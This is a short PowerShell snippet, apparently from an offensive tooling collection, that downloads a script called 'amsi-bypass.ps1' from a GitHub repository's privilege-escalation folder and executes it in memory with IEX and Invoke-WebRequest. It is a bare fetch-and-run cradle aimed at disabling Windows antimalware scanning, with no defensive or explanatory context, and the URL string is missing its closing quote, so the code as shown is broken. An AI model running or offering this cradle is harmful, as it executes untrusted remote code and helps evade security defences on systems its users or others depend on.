$scriptUrl = "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/amsi-bypass.ps1

$scriptBlock = {
    try {
        IEX (Invoke-WebRequest -Uri $scriptUrl)
    }
    catch {
        Write-Error "Error executing external script: $_"
        # Consider exiting the script here if the error is critical
        # exit 1
    }
}

. $scriptBlock
